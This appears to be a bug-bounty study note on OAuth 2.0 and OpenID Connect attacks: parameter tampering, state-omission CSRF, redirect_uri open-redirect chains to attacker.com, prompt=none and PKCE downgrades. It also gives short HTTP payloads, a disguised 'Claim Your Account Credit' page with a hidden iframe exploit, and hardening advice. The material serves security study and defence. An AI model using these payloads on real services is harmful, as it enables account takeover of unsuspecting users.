---
title: "OAuth 2.0 & OpenID Connect (OIDC) Attack Vectors, Account Takeover & Protocol Vulnerabilities"
created: 2026-09-25
updated: 2026-10-01
type: concept
tags:
  - oauth
  - oidc
  - ato
  - bug-bounty
sources:
  - sources/oauth.md
  - sources/authentication-vulnerabilities.md
confidence: high
contested: false
contradictions: []
parent: "[[web-and-bug-bounty]]"
cluster: web-and-bug-bounty
---
# OAuth 2.0 & OpenID Connect (OIDC) Attack Vectors, Account Takeover & Protocol Vulnerabilities

> **Classification**: OAuth 2.0 (RFC 6749) / OpenID Connect Core 1.0, CWE-287 (Improper Authentication), CWE-601 (Open Redirect in Authorization Callback).
> **Primary Impact**: Pre-auth and post-auth Account Takeover (ATO), identity spoofing, authorization code theft, and unauthorized access to third-party resources.

---

<!-- TOC_START -->
## Table of Contents
- [1. OAuth 2.0 & OIDC Protocol Foundations](#1-oauth-20--oidc-protocol-foundations)
  - [Core Roles](#core-roles)
  - [Key Authorization Parameters](#key-authorization-parameters)
  - [OpenID Connect Standard Claims & Scopes](#openid-connect-standard-claims--scopes)
- [2. Attack Vectors in Client Applications](#2-attack-vectors-in-client-applications)
  - [Implicit Flow Authentication Parameter Tampering](#implicit-flow-authentication-parameter-tampering)
  - [Forced OAuth Profile Linking (State Omission CSRF)](#forced-oauth-profile-linking-state-omission-csrf)
  - [Authorization Code Leakage via Referer Headers](#authorization-code-leakage-via-referer-headers)
- [3. Attack Vectors in OAuth Service Providers](#3-attack-vectors-in-oauth-service-providers)
  - [Flawed redirect_uri Validation & Open Redirect Chains](#flawed-redirect_uri-validation--open-redirect-chains)
  - [response_mode=form_post Injection (CVE-2023-6291 Bypass)](#response_modeform_post-injection-cve-2023-6291-bypass)
  - [prompt=none Silent Consent & Code Stealing](#promptnone-silent-consent--code-stealing)
  - [PKCE Downgrades & Code Interception](#pkce-downgrades--code-interception)
- [4. Diagnostic Probes & Reconnaissance Workflows](#4-diagnostic-probes--reconnaissance-workflows)
  - [OpenID Discovery Endpoints](#openid-discovery-endpoints)
  - [Weaponized Profile Linking Exploit](#weaponized-profile-linking-exploit)
- [5. Hardening Guidelines for Providers & Clients](#5-hardening-guidelines-for-providers--clients)
- [6. Primary Sources & Provenance](#6-primary-sources--provenance)
- [Related Pages](#related-pages)
<!-- TOC_END -->

## 1. OAuth 2.0 & OIDC Protocol Foundations

OAuth 2.0 is an authorization framework allowing applications to request limited access to user resources hosted on another service. OpenID Connect (OIDC) adds an identity verification layer on top of OAuth 2.0 by introducing standardized scopes and signed JSON Web Tokens (`id_token`).

### Core Roles
- **Resource Owner**: The user granting access.
- **Client Application**: The application requesting access.
- **Authorization Server**: Issues access tokens and authorization codes.
- **Resource Server**: The API hosting protected user data.

### Key Authorization Parameters

| Parameter | Purpose & Function | Common Security Pitfalls |
| :--- | :--- | :--- |
| `redirect_uri` | Endpoint where authorization codes/tokens are returned | Inexact regex matching, open redirect chaining, path traversal. |
| `response_type` | Specifies flow (`code`, `token`, `id_token`) | Implicit grant tampering; downgraded security. |
| `client_id` | Public client identifier | Leaked in public apps; client impersonation. |
| `scope` | Extent of resource access requested | Over-permissioned tokens, privilege escalation. |
| `state` | Unpredictable anti-CSRF token | Parameter omitted, static value, or unverified on callback. |
| `prompt` | UI interaction control (`none`, `login`, `consent`) | `prompt=none` allows silent authentication without user consent. |
| `response_mode` | Format of returned response (`query`, `fragment`, `form_post`) | Manipulated to inject form actions and bypass fragment parsing. |

### OpenID Connect Standard Claims & Scopes

- **Scopes**: `openid` (mandatory for OIDC), `profile`, `email`, `phone`, `offline_access` (requests refresh token).
- **Standard Claims**: `sub` (permanent unique subject identifier), `name`, `family_name`, `given_name`, `picture`, `email`, `email_verified`.

## 2. Attack Vectors in Client Applications

### Implicit Flow Authentication Parameter Tampering
In poorly designed applications implementing the implicit grant, the browser receives an access token and user identity parameters, which frontend JavaScript forwards to the backend:
```http
POST /authenticate HTTP/1.1
Host: client-app.com
Content-Type: application/json

{"email": "victim@target.com", "token": "z0y9x8w7v6u5"}
```
If the backend accepts the `email` field without validating that the `token` was cryptographically issued to that specific email by the authorization server, an attacker modifies the email parameter to take over any user account!

### Forced OAuth Profile Linking (State Omission CSRF)
When client applications allow linking external social accounts (e.g. "Attach Google Account"):
1. Attacker initiates OAuth linking and captures the callback:
   ```http
   GET /oauth-linking?code=ATTACKER_CODE HTTP/1.1
   ```
2. Drops the request so the code remains unconsumed.
3. If the request lacks a cryptographically validated `state` parameter, the attacker forces the victim to visit this URL via an iframe:
   ```html
   <iframe src="https://target.com/oauth-linking?code=ATTACKER_CODE"></iframe>
   ```
4. The victim's account is linked to the attacker's social profile, enabling subsequent login.

### Authorization Code Leakage via Referer Headers
If the client callback page loads external images, analytics scripts, or CSS:
- The full callback URL containing the secret code (`https://client-app.com/callback?code=SECRET_CODE`) is transmitted in the HTTP `Referer` header to third-party endpoints.

## 3. Attack Vectors in OAuth Service Providers

### Flawed redirect_uri Validation & Open Redirect Chains
- **Regex Flaws**: If the authorization server accepts any redirect URI ending in `target.com`, attackers supply `https://attacker.com?target.com` or `https://target.com.attacker.com`.
- **Open Redirect Chaining**: If `redirect_uri` validation is restricted to `target.com`, but `target.com/oauth/login/redirect?url=...` has an open redirect, the code is leaked via the redirect target:
  ```text
  redirect_uri=https://target.com/oauth/redirect?url=https://attacker.com
  ```

### response_mode=form_post Injection (CVE-2023-6291 Bypass)
In Keycloak (CVE-2023-6291), an attacker changed `response_mode=fragment` to `response_mode=form_post`. This forced the authorization server to return an HTML form that submitted tokens via POST. Due to improper validation on the HTML form's action attribute, attackers directed the form submission to arbitrary attacker-controlled locations!

### prompt=none Silent Consent & Code Stealing
Setting `prompt=none` instructs the authorization server to fail if user interaction is needed. If the victim has already consented or has an active session, the authorization server skips the consent screen and immediately issues an authorization code to the redirect URI without any visual prompt to the victim.

### PKCE Downgrades & Code Interception
Proof Key for Code Exchange (PKCE) prevents authorization code interception on public clients. Attackers attempt to strip `code_challenge` and `code_challenge_method` to force the server into fallback legacy flows.

## 4. Diagnostic Probes & Reconnaissance Workflows

### OpenID Discovery Endpoints
Retrieve configuration and supported grant types:
```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-provider.com

GET /.well-known/oauth-authorization-server HTTP/1.1
Host: oauth-provider.com
```

### Weaponized Profile Linking Exploit
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Claim Your Account Credit</h1>
  <iframe style="display:none;" src="https://target.com/auth/callback?code=STOLEN_AUTH_CODE"></iframe>
</body>
</html>
```

## 5. Hardening Guidelines for Providers & Clients

1. **Strict Exact-Match redirect_uri**: Disallow wildcards, subpaths, and regex pattern matching. Enforce byte-for-byte URI matching.
2. **Mandatory Cryptographic State Parameter**: Bind `state` values to the user's active session cookie using HMAC signatures to defeat CSRF.
3. **Mandate PKCE for All Clients**: Enforce S256 code challenge verification on all authorization code exchanges.
4. **Validate ID Tokens Server-Side**: Verify JWT signatures against trusted JWKS endpoints (`/.well-known/jwks.json`), validating `aud`, `iss`, and `exp` claims.

## 6. Primary Sources & Provenance
- Provenance source anchors: [[sources/oauth|oauth]], [[sources/authentication-vulnerabilities|authentication-vulnerabilities]]

Synthesized from canonical vault notes `unprocessed-obsidians/oauth.md` and `Notes/OLD Notes/WEB/vulnerabilities/Authentication vulnerabilities/`.

## Related Pages
- Parent Hub: [[web-and-bug-bounty]]
- Target Concepts: [[oauth-grant-types-and-flows]], [[account-takeover-and-auth-flaws]], [[broken-authentication-and-credential-attacks]]
- Comparisons: [[authorization-code-vs-implicit-flow]], [[open-redirect-in-oauth-flows]], [[jwt-in-oauth2-architecture]]
